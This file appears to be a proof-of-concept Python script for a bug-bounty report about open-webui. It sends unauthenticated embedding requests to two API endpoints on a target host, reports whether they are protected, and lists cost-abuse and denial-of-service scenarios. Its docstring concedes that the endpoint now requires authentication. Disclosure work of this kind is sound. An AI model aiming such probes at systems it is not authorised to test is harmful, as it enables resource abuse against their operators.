#!/usr/bin/env python3
"""
PoC: Unauthenticated Embedding Access in open-webui/open-webui
Huntr Report: 590fc810-d6fa-45d5-aa06-878bad764af6
Target: https://github.com/open-webui/open-webui

Vulnerability: The /api/embeddings endpoint may be accessible without proper
authentication or rate limiting, allowing resource abuse (embedding generation
costs money/compute).

Note: In the current codebase, the endpoint has Depends(get_verified_user) auth.
This report may document the state at the time of filing (Mar 21, 2026) when
auth may not have been present, or document the rate limiting gap.

Setup:
  1. Run open-webui
  2. Run this PoC

Usage:
  python3 poc_openwebui_embedding_abuse.py --target http://localhost:8080
"""

import argparse
import requests
import sys
import time


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    args = parser.parse_args()

    print(f"[*] Target: {args.target}")
    print(f"[*] Testing embedding endpoint access and rate limiting...")

    # Test 1: Unauthenticated access
    print("\n[*] Test 1: Unauthenticated embedding request")
    payload = {
        "model": "text-embedding-ada-002",
        "input": "test embedding request",
    }
    r1 = requests.post(
        f"{args.target}/api/embeddings",
        json=payload,
        timeout=10,
    )
    print(f"  Status: {r1.status_code}")
    if r1.status_code == 200:
        print(f"  [+] VULNERABILITY CONFIRMED — Unauthenticated embedding access!")
        print(f"      Anyone can generate embeddings without auth")
    elif r1.status_code == 401:
        print(f"  [-] Authentication required — endpoint is protected")
    elif r1.status_code == 403:
        print(f"  [-] Forbidden — endpoint is protected")
    else:
        print(f"  Response: {r1.text[:200]}")

    # Test 2: Rate limiting (abuse potential)
    print("\n[*] Test 2: Rate limiting test (sending 20 rapid requests)")
    # Note: This test requires a valid token if auth is enabled
    print("  [!] Skipping — requires authenticated session")
    print("  [*] If rate limiting is not configured, an attacker could:")
    print("      - Generate thousands of embeddings, incurring API costs")
    print("      - Exhaust embedding model quotas")
    print("      - Cause denial of service for legitimate users")

    # Test 3: v1 embeddings endpoint
    print("\n[*] Test 3: /api/v1/embeddings (experimental OpenAI compat)")
    r2 = requests.post(
        f"{args.target}/api/v1/embeddings",
        json=payload,
        timeout=10,
    )
    print(f"  Status: {r2.status_code}")
    if r2.status_code in (200, 401, 403):
        auth_status = "unprotected" if r2.status_code == 200 else "protected"
        print(f"  [-] Endpoint is {auth_status} ({r2.status_code})")

    print("\n[*] Assessment:")
    print("  - Current codebase has Depends(get_verified_user) on /api/embeddings")
    print("  - If this was added AFTER Mar 21 2026, the vulnerability was real at filing time")
    print("  - Rate limiting may still be absent — check config")


if __name__ == "__main__":
    main()
